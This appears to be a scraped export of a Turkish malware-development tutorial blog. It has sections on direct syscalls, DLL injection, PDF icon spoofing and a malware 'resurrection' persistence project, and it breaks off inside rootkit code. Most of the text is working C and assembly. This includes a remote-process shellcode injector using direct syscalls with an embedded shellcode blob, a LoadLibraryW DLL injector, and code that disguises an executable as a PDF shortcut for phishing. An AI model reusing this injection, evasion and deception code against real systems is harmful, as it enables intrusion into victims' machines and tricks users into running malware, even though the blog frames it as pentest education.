güncelleyelim:\n.data extern NtOpenProcessSSN:DWORD extern NtAllocateVirtualMemorySSN:DWORD extern NtWriteVirtualMemorySSN:DWORD extern NtCreateThreadExSSN:DWORD extern NtWaitForSingleObjectSSN:DWORD extern NtCloseSSN:DWORD .code My_NtOpenProcess PROC mov r10, rcx mov eax, NtOpenProcessSSN syscall ret My_NtOpenProcess ENDP My_NtAllocateVirtualMemory PROC mov r10, rcx mov eax, NtAllocateVirtualMemorySSN syscall ret My_NtAllocateVirtualMemory ENDP My_NtWriteVirtualMemory PROC mov r10, rcx mov eax, NtWriteVirtualMemorySSN syscall ret My_NtWriteVirtualMemory ENDP My_NtCreateThreadEx PROC mov r10, rcx mov eax, NtCreateThreadExSSN syscall ret My_NtCreateThreadEx ENDP My_NtWaitForSingleObject PROC mov r10, rcx mov eax, NtWaitForSingleObjectSSN syscall ret My_NtWaitForSingleObject ENDP END Daha sonra main.h header dosyasını güncelleyelim:\n#include \u003cstdio.h\u003e #include \u003cWindows.h\u003e #define STATUS_SUCCESS (NTSTATUS)0x00000000L DWORD NtOpenProcessSSN; DWORD NtAllocateVirtualMemorySSN; DWORD NtWriteVirtualMemorySSN; DWORD NtCreateThreadExSSN; DWORD NtWaitForSingleObjectSSN; DWORD NtCloseSSN; #pragma region STRUCTURES typedef struct _PS_ATTRIBUTE { ULONG Attribute; SIZE_T Size; union { ULONG Value; PVOID ValuePtr; } u1; PSIZE_T ReturnLength; } PS_ATTRIBUTE, * PPS_ATTRIBUTE; typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } UNICODE_STRING, * PUNICODE_STRING; typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor; PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES; typedef struct _CLIENT_ID { HANDLE UniqueProcess; HANDLE UniqueThread; } CLIENT_ID, * PCLIENT_ID; typedef struct _PS_ATTRIBUTE_LIST { SIZE_T TotalLength; PS_ATTRIBUTE Attributes[1]; } PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST; #pragma endregion extern NTSTATUS My_NtOpenProcess( OUT PHANDLE ProcessHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes, IN PCLIENT_ID ClientId OPTIONAL ); extern NTSTATUS My_NtAllocateVirtualMemory( IN HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN ULONG ZeroBits, IN OUT PSIZE_T RegionSize, IN ULONG AllocationType, IN ULONG Protect ); extern NTSTATUS My_NtWriteVirtualMemory( IN HANDLE ProcessHandle, IN PVOID BaseAddress, IN PVOID Buffer, IN SIZE_T NumberOfBytesToWrite, OUT PSIZE_T NumberOfBytesWritten OPTIONAL ); extern NTSTATUS My_NtCreateThreadEx( OUT PHANDLE ThreadHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN HANDLE ProcessHandle, IN PVOID StartRoutine, IN PVOID Argument OPTIONAL, IN ULONG CreateFlags, IN SIZE_T ZeroBits, IN SIZE_T StackSize, IN SIZE_T MaximumStackSize, IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL ); extern NTSTATUS My_NtWaitForSingleObject( _In_ HANDLE Handle, _In_ BOOLEAN Alertable, _In_opt_ PLARGE_INTEGER Timeout ); Son olarak ise main.c projemizi güncelleyelim:\n#include \"main.h\" char Shellcode[] = \"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\" \"\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\" \"\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\" \"\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\" \"\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\" \"\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\" \"\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\" \"\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\" \"\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\" \"\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\" \"\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\" \"\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\" \"\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\" \"\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\" \"\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\" \"\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\" \"\\x6f\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x41\\xba\\xa6\\x95\\xbd\" \"\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\" \"\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\" \"\\xd5\\x63\\x6d\\x64\\x2e\\x65\\x78\\x65\\x20\\x2f\\x4b\\x20\\x22\\x65\" \"\\x63\\x68\\x6f\\x20\\x44\\x69\\x72\\x65\\x63\\x74\\x20\\x53\\x79\\x73\" \"\\x74\\x65\\x6d\\x63\\x61\\x6c\\x6c\\x73\\x20\\x77\\x69\\x74\\x68\\x20\" \"\\x62\\x65\\x6b\\x6f\\x6f\\x22\"; size_t ShellcodeSize = sizeof(Shellcode); DWORD GetSSN(HMODULE ModuleName, LPCSTR ProcName) { printf(\"\\n***** %s *****\\n\", ProcName); DWORD sysCallNumber = 0; UINT_PTR targetNtFunction; targetNtFunction = (UINT_PTR)GetProcAddress(ModuleName, ProcName); if (targetNtFunction == 0) { printf(\"%s handle retrieval failed Error Code: 0x%lx\\n\", ProcName, GetLastError()); return -1; } sysCallNumber = ((PBYTE)(targetNtFunction + 0x4))[0]; printf(\"SSN number for the %s successfully received! 0x%lx\\n\", ProcName, sysCallNumber); return sysCallNumber; } int main(int argc, char* argv[]) { if (argc \u003c 2) { printf(\"Usage: .\\\\program \u003cPID\u003e\\n\"); return 1; } DWORD PID = atoi(argv[1]); HANDLE HandleProcess = NULL; HANDLE HandleThread = NULL; PVOID RemoteBuffer = NULL; HMODULE NTDLLAddress = GetModuleHandleW(L\"ntdll.dll\"); CLIENT_ID CID = { (HANDLE)PID, NULL }; OBJECT_ATTRIBUTES ObjAttr = { sizeof(ObjAttr), NULL }; NTSTATUS Status = STATUS_SUCCESS; NtOpenProcessSSN = GetSSN(NTDLLAddress, \"NtOpenProcess\"); Status = My_NtOpenProcess(\u0026HandleProcess, PROCESS_ALL_ACCESS, \u0026ObjAttr, \u0026CID); if (Status != STATUS_SUCCESS) { printf(\"NtOpenProcess failed! Error Code: 0x%lx\\n\", Status); CloseHandle(HandleProcess); return 1; } NtAllocateVirtualMemorySSN = GetSSN(NTDLLAddress, \"NtAllocateVirtualMemory\"); Status = My_NtAllocateVirtualMemory(HandleProcess, \u0026RemoteBuffer, 0, \u0026ShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (Status != STATUS_SUCCESS) { printf(\"NtAllocateVirtualMemory failed! Error Code: 0x%lx\\n\", Status); CloseHandle(HandleProcess); return 1; } NtWriteVirtualMemorySSN = GetSSN(NTDLLAddress, \"NtWriteVirtualMemory\"); Status = My_NtWriteVirtualMemory(HandleProcess, RemoteBuffer, Shellcode, ShellcodeSize, NULL); if (Status != STATUS_SUCCESS) { printf(\"NtWriteVirtualMemory failed! Error Code: 0x%lx\\n\", Status); CloseHandle(HandleProcess); return 1; } NtCreateThreadExSSN = GetSSN(NTDLLAddress, \"NtCreateThreadEx\"); Status = My_NtCreateThreadEx(\u0026HandleThread, THREAD_ALL_ACCESS, NULL, HandleProcess, (LPTHREAD_START_ROUTINE)RemoteBuffer, NULL, FALSE, 0, 0, 0, NULL); if (Status != STATUS_SUCCESS) { printf(\"NtCreateThreadEx failed! Error Code: 0x%lx\\n\", Status); return 1; } NtWaitForSingleObjectSSN = GetSSN(NTDLLAddress, \"NtWaitForSingleObject\"); Status = My_NtWaitForSingleObject(HandleThread, FALSE, NULL); if (Status != STATUS_SUCCESS) { printf(\"NtWaitForSingleObject failed! Error Code: 0x%lx\\n\", Status); CloseHandle(HandleThread); CloseHandle(HandleProcess); return 1; } printf(\"Shellcode executed successfully\\n\"); CloseHandle(HandleThread); CloseHandle(HandleProcess); return 0; } Kodların neler yaptığını bildiğimiz için anlatmama gerek yok direkt olarak sonucu görelim:\nSonuç Bu konuda user mode programdan direkt olarak nasıl syscall yapılır bunu gördük.\nUmarım konu sizin için faydalı olmuştur. Diğer blogta görüşmek üzere.\nReferences Wikipedia - System Call\nREDOPS - Direct Syscalls: A journey from high to low","sonuç#\u003cstrong\u003eSonuç\u003c/strong\u003e":"","system-call-nedir#\u003cstrong\u003eSystem Call Nedir?\u003c/strong\u003e":""},"title":"Direct Syscalls"},"/tr/docs/malware-dev/dll-injection/":{"data":{"":"","dll-injection#\u003cstrong\u003eDLL Injection\u003c/strong\u003e":"","dll-kodlama#DLL kodlama":"","dll-nedir#\u003cstrong\u003eDLL Nedir?\u003c/strong\u003e":"","kod#Kod":"","references#\u003cstrong\u003eReferences\u003c/strong\u003e":"Merhabalar. Bu blogta DLL Injection tekniğini inceleyeceğiz.\nDLL Nedir? DLL (Dynamic Link Library), aynı anda birden fazla program tarafından kullanılan kod ve veri içeren kütüphanelerdir. Windows işletim sisteminde bir program çalıştırdığınızda veya Windows işletim sistemi bir işlevi yerine getirmek istediği zaman DLL’leri şeyi kullanır.\nBu kütüphaneler, genellikle yukarıda bahsettiğim gibi birden fazla uygulamada ortak olan kodları, işlevleri veya kaynakları içerir. Bu, kod tekrarını azaltır ve uygulama boyutlarını küçültür. DLL’ler, yalnızca gerektiğinde belleğe yüklenir ve bu da sistem kaynaklarının verimli kullanılmasını sağlar.\nArtık teorik olarak DLL‘in ne olduğunu biliyoruz ama bu teknikte ne yapıyoruz? Bir de buna bakalım.\nDLL kodlama Bu konuda sadece “DLL budur” diyerek konuyu teorik olarak bırakmak istemiyorum. DLL’in ne olduğu kafamızda daha netleşmesi açısından Visual Studio ortamında DLL projesi oluşturacağız ve basitçe kodlamasını yapacağız. Ardından ise DLL Injection yöntemi ile hazırladığımız DLL’i enjekte edeceğiz. “DLL için kodlamayı nasıl yapacağız?” gibi sorularla kafanızda bir şüphe oluşmasın. DLL’ler C/C++ dilleriyle kodlanıyor, dolayasıyla geliştirmemiz zor olmayacak.\nVisual Studio açalım ve Create a new Project’e tıklayalım ve arama yerine ‘Dynamic’ diye aratalım:\nArdından bunu seçelim ve projemize isim vererek projeyi oluşturalım. Proje oluşturulduktan sonra aşağıdaki kodlar bizi karşılıyor olacak:\nDLL’lerin main alanı DllMain’dir. Tıpkı C projelerimizde nasıl main fonksiyonuna kod yazıyorsak, DLL projelerinde de başlangıç noktası burasıdır. Ancak burada bir fark var: DllMain fonksiyonu, birkaç özel parametre alır ve bu parametreler DLL’in yaşam döngüsünü yönetmek için kullanılır.\nDllMain’in parametreleri:\nhModule: Bu parametre, DLL’nin yüklendiği modülün bir tanıtıcısıdır (handle). Bu, genellikle DLL’nin bellek adresine işaret eder ve işlem boyunca benzersizdir. ul_reason_for_call: Bu, DLL’nin hangi sebeple çağrıldığını belirtir. Özellikle bunu aklınızda tutun çünkü birazdan aşağıda daha detaylı ele alacağım. lpReserved: Yükleme ve boşaltma sırasında ek bilgi taşımak için kullanılır. Bu parametre genellikle nadiren kullanılır. DLLMain içerisindeki switch-case yapısı, ul_reason_for_call parametresine göre çalışır. Bu parametre, DLL’in hangi durumda olduğunu belirtir. Burada dört farklı durum vardır ve bunları sırayla inceleyelim:\nDLL_PROCESS_ATTACH: Bu, DLL’nin bir işlem tarafından ilk kez yüklendiği anlamına gelir. Yani program çalışırken DLL’yi kullanmaya başladığında buraya geliriz. DLL_THREAD_ATTACH: Eğer programınız içinde yeni bir thread oluşturulursa, bu durum devreye girer. Örneğin, thread’e özel veriler veya ayarlar yapmak isterseniz bu durumda kod yazabilirsiniz. DLL_THREAD_DETACH: Bu, bir iş parçacığı sona erdiğinde çağrılır. İş parçacığıyla ilişkili özel kaynakları serbest bırakmak veya temizlik işlemleri yapmak için burayı kullanabilirsiniz. DLL_PROCESS_DETACH: DLL artık kullanılmadığında veya program kapatıldığında bu durum gerçekleşir. Yani program kapanmadan önce ne gerekiyorsa bu kısımda yapılır. Son olarak, TRUE döndürmek DLL’in başarıyla yüklendiğini veya çalıştığını belirtir. Eğer bir sorun oluştuysa, FALSE döndürebiliriz. Ancak TRUE genellikle varsayılan seçenektir.\nBizim kodlama için ilgileneceğimiz durum, DLL_PROCESS_ATTACH olacaktır. Şimdi burada basit bir kodlama yapalım:\nTekrarlamaktan zarar gelmez, DLL_PROCESS_ATTACH alanında kodladığıma dikkat edin. Burada basitçe MessageBoxA kullanarak bir “Ben zararsiz bir dllim” mesajını ekrana bastırıyoruz (mesajı yazarken ben bile zararsız olduğuna inandım). Hedef process bu DLL yüklediği zaman bu kod çalıştırılmış olacak.\nSolution Explorer‘da projemize sağ tıklayıp Rebuild seçeceğine tıklayalım ve /x64/Debug dizininden oluşturulan .dll’e göz atalım:\nGöründüğü gibi bir .dll ve .pdb dosyaları elde ediyoruz. Bu .dll dosyasını erişebileceğiniz başka bir yere kaydedebilirsiniz. Tekniği kullanırken .dll dosyanın tam yoluna ihtiyacımız olacak.\nŞimdi ise tekniğimizi inceleyelim.\nDLL Injection Artık temelde bir DLL’in ne olduğunu ve basitçe kodlamasını biliyoruz.\nDLL Injection tekniği, bir process içerisine zararlı DLL’in enjekte edilmesi içerir. Tıpkı önceki konumuzda yaptığımız gibi zararlı shellcode’u enjekte etmek gibi düşünün.\nYüklenen zararlı DLL ile artık amacınız ne ise ona göre Process’in davranışını değiştirebilirsiniz. Kulağada ne kadar da sadece Malware Development için kullanılan bir teknik gibi algılansa da debugging için amaçlarla da kullanıldığını burada vurgulamak isterim.\nHatırlarsanız önceki konumuzda elimizdeki shellcode’u hedef process’e gömüyorduk bellek aracılığıyla. Dediğim gibi bu yöntemi de bunun gibi düşünebilirsiniz. Hedef Process belleğine DLL’imizin yolunu gömeceğiz ve ardından Process’in LoadLibraryW çalıştırmasını sağlayarak zararlı DLL’i yüklemiş olacak.\nKod #include \u003cstdio.h\u003e #include \u003cWindows.h\u003e int main(int argc, char* argv[]) { DWORD PID = 0; HANDLE HandleProcess = NULL; HANDLE HandleThread = NULL; LPVOID RemoteBuffer = NULL; LPTHREAD_START_ROUTINE LoadLibraryAddress = NULL; wchar_t DllPath[MAX_PATH] = L\"C:\\\\Users\\\\bekoo\\\\bekoo.dll\"; DWORD DllPathSize = sizeof(DllPath); if (argc \u003c 2) { printf(\"Usage: %s \u003cPID\u003e\\n\", argv[0]); return 1; } PID = atoi(argv[1]); printf(\"Injecting DLL into PID %d\\n\", PID); LoadLibraryAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleW(L\"kernel32.dll\"), \"LoadLibraryW\"); if (LoadLibraryAddress == NULL) { printf(\"Failed to get LoadLibraryW address\\n\"); return 1; } printf(\"LoadLibraryW address: 0x%p\\n\", LoadLibraryAddress); HandleProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID); if (HandleProcess == NULL) { printf(\"Failed to open process\\n\"); return 1; } RemoteBuffer = VirtualAllocEx(HandleProcess, NULL, DllPathSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (RemoteBuffer == NULL) { printf(\"Failed to allocate memory in remote process\\n\"); return 1; } if (!WriteProcessMemory(HandleProcess, RemoteBuffer, DllPath, DllPathSize, NULL)) { printf(\"Failed to write DLL path to remote process\\n\"); return 1; } HandleThread = CreateRemoteThreadEx(HandleProcess, NULL, 0, LoadLibraryAddress, RemoteBuffer, 0, NULL, NULL); if (HandleThread == NULL) { printf(\"Failed to create remote thread\\n\"); return 1; } WaitForSingleObject(HandleThread, INFINITE); printf(\"DLL injected\\n\"); return 0; } Eğer Shellcode Execution blogumu okudu iseniz bu kodlar yabancı gelmeyecektir. Çünkü neredeyse aynı şeyleri yapıyoruz birkaç şey dışında. Önceki konuda LoadLibrary gibi şeyler kullanmadık. Şimdi buna bir bakalım:\nLoadLibraryAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleW(L\"kernel32.dll\"), \"LoadLibraryW\"); if (LoadLibraryAddress == NULL) { printf(\"Failed to get LoadLibraryW address\\n\"); return 1; } printf(\"LoadLibraryW address: 0x%p\\n\", LoadLibraryAddress); Burada GetProcAddress ile kernel32.dll içerisinden LoadLibraryW API’in adresini elde ediyoruz ve alınan adres LoadLibraryAddress değişkenine aktarılıyor.\nDaha sonra bir if kontrolü yapıyoruz. Eğer GetProcAddress NULL döndürmüş ise fonksiyonun adresi alınmamış demektir ve bu yüzden programı bir hata mesajı ile kapatıyoruz. “Eee? Bu adresi nerede kullanıyoruz?” diye bir soru gelebilir hemen göstereyim:\nHandleThread = CreateRemoteThreadEx(HandleProcess, NULL, 0, LoadLibraryAddress, RemoteBuffer, 0, NULL, NULL); if (HandleThread == NULL) { printf(\"Failed to create remote thread\\n\"); return 1; } Bu adresi, CreateRemoteThreadEx’in dördüncü parametresi olan lpStartAddress’e ve ayrılan bellek adresini lpParameter olarak verdiğime dikkat edin. Buradaki amacımız hedef Process’e verilen adres, elde ettiğimiz LoadLibraryW fonksiyonun adresidir. Bu fonksiyon kullanarak hazırladığımız DLL’i yüklenmesi sağlanacaktır. RemoteBuffer değeri ise LoadLibraryW fonksiyonu için parametre olarak veriyoruz.\nDiğer kod parçaları zaten önceki blogumda anlattığım gibi aynı.\nSonuç Sonuçta gördüğümüz gibi paint uygulamasının PID değerini verdiğimizde DLL’i enjekte ediyor ve mesajımızı görüyoruz.\nUmarım sizler için faydalı olmuştur iyi çalışmalar dilerimm.\nReferences Microsoft Learn - DLL nedir? ","sonuç#\u003cstrong\u003eSonuç\u003c/strong\u003e":""},"title":"DLL Injection"},"/tr/docs/malware-dev/file-icon-spoofing/":{"data":{"":"","code#Code":"","programı-çalıştırma#Programı Çalıştırma":"","references#References":"Merhabalar, bu yazıda File Icon Spoofing tekniğini inceleyeceğiz.\nKısaca tekniği özetlemek gerekirse oluşturulan malware’in programın icon’u değiştirilerek kullanıcıyı yanıltma tekniğidir. Bu sayede kullanıcı, ilgili malware’i zararsız bir dosya olarak görebilir. Malware için belirlediğiniz icon, bu konuda örnek olarak gösterileceği gibi bir PDF olabilir veya bir başka icon olabilir. Tekniğin, sosyal mühendislik saldırıları için oldukça etkili bir yöntem olabilir ve ayrıca Pentest ve Red Team çalışmalarında da kullanılışlı olabilir.\nKonunun daha iyi anlaşılması için örnek senaryo üzerinden ilerleyelim, bir şirketin iç ağının güvenliğini test etmek amacıyla görevlendirilmiş bir pentester olduğunuzu düşünün. Şirket çalışanlarının kötü amaçlı dosyaları açma konusunda ne kadar dikkatli olduklarını test etmeniz gerekiyor. Bu bağlamda, kötü amaçlı yazılımınızı zararsız bir PDF dosyası olarak maskeleyerek, bir kimlik avı e-postası aracılığıyla veya paylaşılan bir klasöre yerleştirerek gönderebilirsiniz. Eğer bir çalışan bu dosyayı açarsa, dosya aslında zararlı yazılımı çalıştırarak sistemlerine erişim sağlar.\nCode Bu konu için kullandığım kod parçası, S12 H4CK’in PDF Icon File Spoofing konusundan alınmış ve tarafımca güncellenmiştir. Daha fazla detay için Referanslar kısmından makalesine göz atabilirsiniz.\nHazırlanan örnek kod parçasının github link’ine erişmek için buraya tıklayabilirsiniz.\n#include \u003cstdio.h\u003e #include \u003cstrsafe.h\u003e #include \u003cwchar.h\u003e #include \u003cShlObj.h\u003e #include \u003cobjbase.h\u003e #include \u003cWindows.h\u003e BOOL CreateShortcut(const wchar_t* TargetPath, const wchar_t* ShortcutPath, const wchar_t* IconPath ) { HRESULT HRES; IShellLink* PSL = NULL; IPersistFile* PPF = NULL; CoInitialize(NULL); HRES = CoCreateInstance(\u0026CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, \u0026IID_IShellLink, (void**)\u0026PSL); if (FAILED(HRES)) { wprintf(L\"Failed to create IShellLink Object! Error Code: 0x%08X\\n\", HRES); return 1; } PSL-\u003elpVtbl-\u003eSetPath(PSL, TargetPath); PSL-\u003elpVtbl-\u003eSetIconLocation(PSL, IconPath, 0); PSL-\u003elpVtbl-\u003eSetDescription(PSL, L\"Very important file\"); HRES = PSL-\u003elpVtbl-\u003eQueryInterface(PSL, \u0026IID_IPersistFile, (void**)\u0026PPF); if (FAILED(HRES)) { wprintf(L\"Failed to interface! Error Code: 0x%08X\\n\", HRES); return 1; } HRES = PPF-\u003elpVtbl-\u003eSave(PPF, ShortcutPath, TRUE); PPF-\u003elpVtbl-\u003eRelease(PPF); PSL-\u003elpVtbl-\u003eRelease(PSL); CoUninitialize(); wprintf(L\"Shortcut Created!\\n\"); return 0; } int main() { wchar_t TargetPath[MAX_PATH] = L\"C:\\\\Windows\\\\System32\\\\calc.exe\"; wchar_t IconPath[MAX_PATH] = L\"C:\\\\path\\\\to\\\\pdficon.ico\"; wchar_t ShortcutPath[MAX_PATH]; HRESULT HRFolder; HRFolder = SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, ShortcutPath); if (FAILED(HRFolder)) { wprintf(L\"Failed to get Desktop Path! Error Code: 0x%08X\\n\", HRFolder); return 1; } StringCchCatW(ShortcutPath, MAX_PATH, L\"\\\\Projects.lnk\"); wprintf(L\"Merged Path: %s\\n\", ShortcutPath); if (CreateShortcut(TargetPath, ShortcutPath, IconPath) \u003e 0) { wprintf(L\"Failed to create Shortcut!\\n\"); return -1; } return 0; } Kodlara detaylıca göz atalım ve main içerisinden başlayalım:\nwchar_t TargetPath[MAX_PATH] = L\"C:\\\\Windows\\\\System32\\\\calc.exe\"; wchar_t IconPath[MAX_PATH] = L\"C:\\\\path\\\\to\\\\pdficon.ico\"; wchar_t ShortcutPath[MAX_PATH]; TargetPath: Bu değişken, oluşturulacak kısayolun hedef dosyasının yolunu belirtir. Bu değişken bizim malware’in yolunu belirtir. IconPath: Bu değişken, oluşturulacak kısayolun icon’unun yolunu belirtir. ShortcutPath: Bu değişken, oluşturulacak kısayolun yolunu belirtir. HRFolder = SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, ShortcutPath); if (FAILED(HRFolder)) { wprintf(L\"Failed to get Desktop Path! Error Code: 0x%08X\\n\", HRFolder); return 1; } StringCchCatW(ShortcutPath, MAX_PATH, L\"\\\\Projects.lnk\"); wprintf(L\"Merged Path: %s\\n\", ShortcutPath); Bu kısımda ise ilk olarak SHGetFolderPath fonksiyonu ile desktop dizinin tam yolunu alıyoruz. Ardından alınan dizin yoluna ise StringCchCatW aracılığıyla oluşturulacak kısayol ismi ile birleştiriyoruz. Bu sayede oluşturulacak kısayol’un tam yolunu elde etmiş oluyoruz.\nBu kısayol ismini Projects.lnk olarak ayarladım. Siz dilerseniz bunu değiştirebilirsiniz. if (CreateShortcut(TargetPath, ShortcutPath, IconPath) \u003e 0) { wprintf(L\"Failed to create Shortcut!\\n\"); return -1; } Bu kısımda ise oluşturduğumuz CreateShortcut fonksiyonunu çağırıyoruz ve if ile bir karşılaştırma yapıyoruz. Eğer CreateShortcut fonksiyonu 0’dan yüksek yani 1 değerini döndürürse hata mesajı ekrana bastırarak -1 ile programı return ettiriyoruz. CoInitialize(NULL); HRES = CoCreateInstance(\u0026CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, \u0026IID_IShellLink, (void**)\u0026PSL); if (FAILED(HRES)) { wprintf(L\"Failed to create IShellLink Object! Error Code: 0x%08X\\n\", HRES); return 1; } CreateShortcut fonksiyon içerisinde ise ilk olarak CoInitialize fonksiyonu ile COM bileşenlerini başlatıyoruz. Peki ama neden COM bileşenlerini başlatıyoruz?\nÇünkü IShellLink ve IPersistFile interface’leri COM bileşenleridir. Bu interface’ler bizim kısayol oluşturmak için kullanacağımız araçlardır. Dolayasıyla bunlara erişmemiz için COM bileşenlerini başlatmamız gerekmektedir.\nArdından CoCreateInstance fonksiyonu ile IShellLink interface’ini oluşturuyoruz. Eğer bu işlem başarısız olursa hata mesajı bastırarak programı return ettiriyoruz. PSL-\u003elpVtbl-\u003eSetPath(PSL, TargetPath); PSL-\u003elpVtbl-\u003eSetIconLocation(PSL, IconPath, 0); PSL-\u003elpVtbl-\u003eSetDescription(PSL, L\"Very important file\"); HRES = PSL-\u003elpVtbl-\u003eQueryInterface(PSL, \u0026IID_IPersistFile, (void**)\u0026PPF); if (FAILED(HRES)) { wprintf(L\"Failed to interface! Error Code: 0x%08X\\n\", HRES); return 1; } Bu kod bloğunda ise oluşturduğumuz IShellLink interface’ine Target Path, Icon Path ve Description ekliyoruz. Bu adımlar, oluşturacağımız kısayolun özelliklerini belirtir.\nArdından QueryInterface fonksiyonu ile IPersistFile interface’ine erişim sağlıyoruz. Eğer bu işlem başarısız olursa hata mesajı bastırarak programı return ettiriyoruz. HRES = PPF-\u003elpVtbl-\u003eSave(PPF, ShortcutPath, TRUE); PPF-\u003elpVtbl-\u003eRelease(PPF); PSL-\u003elpVtbl-\u003eRelease(PSL); CoUninitialize(); wprintf(L\"Shortcut Created!\\n\"); Son olarak ise Save fonksiyonu ile oluşturduğumuz kısayolu, main içerisinde oluşturduğumuz tam yoluna kaydediyoruz. Ardından IPersistFile ve IShellLink interface’lerini serbest bırakıyoruz. CoUninitialize fonksiyonu ile COM bileşenlerini sonlandırıyoruz. Son olarak kısayolun oluşturulduğuna dair bir mesaj bastırıyoruz. Programı Çalıştırma Programı çalıştırdığımızda ise masaüstünde kısayolumuz aşağıdaki gibi gözükecektir:\nKısayolumuz aslında pdf gibi gözükse de özelliklerine göz attığımızda aslında farklı bir program çalıştıracaktır:\nÖzelliklerine göz attığımızda ise aslında bu kısayolun calc.exe programını çalıştırdığını görmekteyiz.\nSonuç Bu konumda, icon file spoofing tekniğini ele aldık. Unutmayın ki bu teknik, Pentest ve Red Team çalışmalarında da kullanılışlı olabilir.\nUmarım faydalı olmuştur, teşekkürler! 🚀\nReferences S12 H4CK - PDF Icon File Spoofing ","sonuç#Sonuç":""},"title":"PDF Icon File Spoofing"},"/tr/docs/malware-dev/malware-resurrection/":{"data":{"":"","#":"Malware Resurrection Malware Resurrection tekniği, belirli malware’in sonlandırıldıktan sonra bile aktif kalmasını sağlamak için kullanılan bir kalıcılık tekniğinidir. Bu teknik, kötü amaçlı yazılımın kullanıcı tarafından kapatılması, güvenlik yazılımı tarafından sonlandırılması veya bir hata nedeniyle çökmesi durumunda otomatik olarak yeniden başlatılmasını veya ana bilgisayarı yeniden enfekte etmesini sağlar.\nDiğer bir deyişle, kötü amaçlı yazılım kendini “izler” veya yürütme durumunu izleyen ve artık çalışmıyorsa hemen yeniden başlatan bir yardımcı işleme sahiptir.\nThe Project Projemde, her iki modun avantajlarından yararlanarak malware resurrection tekniğini uygulamak için bir rootkit ve bir usermode geliştirdim. Usermode program malware’i dinler ve eğer malware sonlandırılırsa, yeniden başlatmak için hemen diriltmek için adımlara başlar. Rootkit, DKOM saldırıları vb. yoluyla diriliş sürecini güçlendirir.\nŞema üzerinden gidebiliriz:\nListening the Malware from User Mode Program İlk olarak usermode program, proje içerisindeki IsProcessRunning fonksiyonu ile malware process’ini dinlemeye başlar:\nBOOLEAN IsProcessRunning(DWORD ProcessID) { HANDLE HandleProcessSnap = NULL; PROCESSENTRY32 PE32; BOOL Status = FALSE; HandleProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (INVALID_HANDLE_VALUE == HandleProcessSnap) { return FALSE; } PE32.dwSize = sizeof(PROCESSENTRY32); if (!Process32First(HandleProcessSnap, \u0026PE32)) { CloseHandle(HandleProcessSnap); return FALSE; } do { if (PE32.th32ProcessID == ProcessID) { Status = TRUE; break; } } while (Process32Next(HandleProcessSnap, \u0026PE32)); CloseHandle(HandleProcessSnap); return Status; } Fikir basit: Önce çalışan tüm process’lerin snapshot’ı alınıyor, sonra Process32First ve Process32Next ile sırayla geziliyor. Her process’in th32ProcessID’si hedef ProcessID ile karşılaştırılıyor. Eğer eşleşme varsa Status TRUE oluyor ve döngü kırılıyor. Hiç bulunamazsa FALSE kalıyor.\nFonksiyon FALSE dönerse, program devam edip gizli bir klasör oluşturuyor.\nCreating Hidden Folder İlk adım olarak program rootkit ile bağlantı kuruyor ve rootkit System32 altında gizli bir dosya oluşturuyor. Rootkit kısmı oldukça basit. CreateHiddenFile fonksiyonundan:\nNTSTATUS 